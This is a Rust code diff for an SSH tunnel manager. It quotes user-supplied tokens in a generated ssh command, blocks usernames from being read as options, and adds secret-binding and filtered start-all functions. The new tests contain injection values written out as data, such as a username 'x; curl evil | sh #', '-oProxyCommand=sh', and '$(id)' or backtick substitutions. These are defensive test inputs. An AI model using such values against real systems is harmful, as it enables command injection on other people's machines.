@@ -16,6 +16,7 @@ use std::sync::Arc;
 use uuid::Uuid;
 
 use crate::error::AppError;
+use crate::ops::variables::{self, Binding};
 use crate::ssh::engine;
 use crate::state::models::{
     ForwardConfig, ForwardInput, ForwardRuntime, ForwardStatus, HostKeyPin, TunnelStats,
@@ -83,7 +84,9 @@ pub fn input_from_config(cfg: &ForwardConfig) -> ForwardInput {
 ///   `"<localBindAddress>:"`.
 /// - `-p <sshPort>` is ALWAYS emitted (v1 does, even for port 22).
 /// - `-i <identityFilePath>` only when set & non-empty; the path is wrapped in
-///   double quotes ONLY if it contains a space (v1's rule).
+///   POSIX single quotes when it contains anything a shell would interpret
+///   (v1 used double quotes for a space only, which does not stop `$()`).
+///   Every other user-supplied token is quoted the same way.
 pub fn build_ssh_command(cfg: &ForwardConfig) -> String {
     let bind_prefix = if cfg.local_bind_address == "127.0.0.1" {
         String::new()
@@ -99,7 +102,7 @@ pub fn build_ssh_command(cfg: &ForwardConfig) -> String {
         "ssh".to_string(),
         "-N".to_string(),
         "-L".to_string(),
-        forward_spec,
+        shell_quote(&forward_spec),
         "-p".to_string(),
         cfg.ssh_port.to_string(),
     ];
@@ -107,16 +110,32 @@ pub fn build_ssh_command(cfg: &ForwardConfig) -> String {
     if let Some(identity) = cfg.identity_file_path.as_deref() {
         if !identity.is_empty() {
             parts.push("-i".to_string());
-            parts.push(if identity.contains(' ') {
-                format!("\"{identity}\"")
-            } else {
-                identity.to_string()
-            });
+            parts.push(shell_quote(identity));
         }
     }
 
-    parts.push(format!("{}@{}", cfg.ssh_username, cfg.ssh_host));
+    let destination = format!("{}@{}", cfg.ssh_username, cfg.ssh_host);
+    if destination.starts_with('-') {
+        // Never let a username (typed, imported or from a variable) be read
+        // by `ssh` as an option such as `-oProxyCommand=…`.
+        parts.push("--".to_string());
+    }
+    parts.push(shell_quote(&destination));
     parts.join(" ")
+}
+
+/// POSIX single-quote `token` unless it only holds characters a shell treats
+/// literally — a username or host with spaces, `;`, `$()` or backticks must
+/// not turn a pasted command into another one.
+fn shell_quote(token: &str) -> String {
+    let literal = token
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || "@._+-:,/%=~".contains(c));
+    if literal && !token.is_empty() {
+        token.to_string()
+    } else {
+        format!("'{}'", token.replace('\'', "'\\''"))
+    }
 }
 
 /// `copy_ssh_command`: [`build_ssh_command`] with the username's `{{NAME}}`
@@ -152,12 +171,27 @@ pub fn runtime_or_default(state: &Arc<AppState>, id: &str) -> ForwardRuntime {
 /// Append a new forward (fresh uuid, no stored password) and persist. The
 /// password (if any) is a separate [`set_password`] call.
 pub async fn create(state: &Arc<AppState>, input: ForwardInput) -> Result<ForwardConfig, AppError> {
+    create_as(state, input, Binding::Required).await
+}
+
+/// [`create`] with the secret-variable binding rule chosen by the driver
+/// (spec 03 §24): `BindAfterSave` for the desktop app, the CLI, or a web save
+/// that consumed a proof grant; `Required` otherwise.
+pub async fn create_as(
+    state: &Arc<AppState>,
+    input: ForwardInput,
+    binding: Binding,
+) -> Result<ForwardConfig, AppError> {
     let _guard = state.lock_variables().await;
-    let input = crate::ops::variables::check_forward_input(state, input)?;
+    let input = variables::check_forward_input_as(state, input, binding)?;
     let config = config_from_input(Uuid::new_v4().to_string(), input, false, None);
     state.upsert_config(config.clone());
     state.persist_forwards().await?;
     state.emit_forwards_changed();
+    if binding == Binding::BindAfterSave {
+        variables::bind_saved_locked(state, &config).await?;
+    }
+    variables::prune_bindings_locked(state).await?;
     Ok(config)
 }
 
@@ -169,10 +203,20 @@ pub async fn update(
     id: String,
     input: ForwardInput,
 ) -> Result<ForwardConfig, AppError> {
+    update_as(state, id, input, Binding::Required).await
+}
+
+/// [`update`] with the binding rule chosen by the driver (see [`create_as`]).
+pub async fn update_as(
+    state: &Arc<AppState>,
+    id: String,
+    input: ForwardInput,
+    binding: Binding,
+) -> Result<ForwardConfig, AppError> {
     let existing = state
         .get_config(&id)
         .ok_or_else(|| AppError::NotFound(format!("forward {id}")))?;
-    let input = crate::ops::variables::check_forward_input(state, input)?;
+    let input = variables::check_forward_input_as(state, input, binding)?;
 
     // Editing a connected/live config force-disconnects first (v1 parity): the
     // running tunnel used the OLD host/port/auth, so it must be torn down before
@@ -185,7 +229,7 @@ pub async fn update(
     // changed kind while the tunnel was being torn down (the early check above
     // only spares the user a pointless disconnect).
     let _guard = state.lock_variables().await;
-    let input = crate::ops::variables::check_forward_input(state, input)?;
+    let input = variables::check_forward_input_as(state, input, binding)?;
 
     // A stored password belongs to ONE login (user @ host : port). If the edit
     // points the forward elsewhere, drop it: otherwise anyone who may edit
@@ -219,6 +263,11 @@ pub async fn update(
     state.upsert_config(config.clone());
     state.persist_forwards().await?;
     state.emit_forwards_changed();
+    if binding == Binding::BindAfterSave {
+        variables::bind_saved_locked(state, &config).await?;
+    }
+    // A forward moved away from a server may leave its binding unused.
+    variables::prune_bindings_locked(state).await?;
     Ok(config)
 }
 
@@ -230,9 +279,12 @@ pub async fn delete(state: &Arc<AppState>, id: &str) -> Result<(), AppError> {
     }
     // Best-effort secret cleanup so a deleted forward never orphans a password.
     state.delete_password(id);
+    let _guard = state.lock_variables().await;
     if state.remove_config(id) {
         state.persist_forwards().await?;
         state.emit_forwards_changed();
+        // Its secret variable's binding may now be unused.
+        variables::prune_bindings_locked(state).await?;
     }
     Ok(())
 }
@@ -448,7 +500,19 @@ pub async fn forget_host_key(state: &Arc<AppState>, id: &str) -> Result<ForwardC
 /// global tray/palette/keymap action. Best-effort: a per-tunnel failure is
 /// logged inside the engine and does not abort the sweep.
 pub async fn run_start_all(state: &Arc<AppState>) -> Result<(), AppError> {
+    run_start_all_where(state, |_| true).await
+}
+
+/// [`run_start_all`] over the forwards `include` accepts (the web transport
+/// leaves out ones it may not dial yet — spec 03 §24).
+pub async fn run_start_all_where(
+    state: &Arc<AppState>,
+    include: impl Fn(&ForwardConfig) -> bool,
+) -> Result<(), AppError> {
     for cfg in state.configs_snapshot() {
+        if !include(&cfg) {
+            continue;
+        }
         match state.registry.current_status(&cfg.id) {
             // Already live and healthy/transitioning — leave it.
             Some(ForwardStatus::Connected)
@@ -560,7 +624,7 @@ mod tests {
         // Token order: -N, -L, -p, -i, user@host; quoted only because of the space.
         assert_eq!(
             build_ssh_command(&cfg),
-            "ssh -N -L 5432:db.internal:5432 -p 22 -i \"/Users/me/My Keys/id\" deploy@bastion.example.com"
+            "ssh -N -L 5432:db.internal:5432 -p 22 -i '/Users/me/My Keys/id' deploy@bastion.example.com"
         );
     }
 
@@ -704,5 +768,30 @@ mod tests {
             None,
             "the secret itself is deleted"
         );
+    }
+
+    #[test]
+    fn the_destination_is_quoted_and_never_read_as_an_option() {
+        let mut cfg = base_config();
+        cfg.ssh_username = "x; curl evil | sh #".into();
+        assert!(build_ssh_command(&cfg).ends_with("'x; curl evil | sh #@bastion.example.com'"));
+        cfg.ssh_username = "o'brien".into();
+        assert!(build_ssh_command(&cfg).ends_with("'o'\\''brien@bastion.example.com'"));
+        cfg.ssh_username = "-oProxyCommand=sh".into();
+        assert!(build_ssh_command(&cfg).ends_with(" -- -oProxyCommand=sh@bastion.example.com"));
+        cfg.ssh_username = "deploy".into();
+        assert!(build_ssh_command(&cfg).ends_with(" deploy@bastion.example.com"));
+    }
+
+    #[test]
+    fn every_user_supplied_token_is_quoted() {
+        let mut cfg = base_config();
+        cfg.remote_host = "db$(id)".into();
+        cfg.identity_file_path = Some("/k/`id`".into());
+        let out = build_ssh_command(&cfg);
+        assert!(out.contains("-L '5432:db$(id):5432'"), "{out}");
+        assert!(out.contains("-i '/k/`id`'"), "{out}");
+        cfg.identity_file_path = Some("~/.ssh/id_ed25519".into());
+        assert!(build_ssh_command(&cfg).contains("-i ~/.ssh/id_ed25519 "));
     }
 }
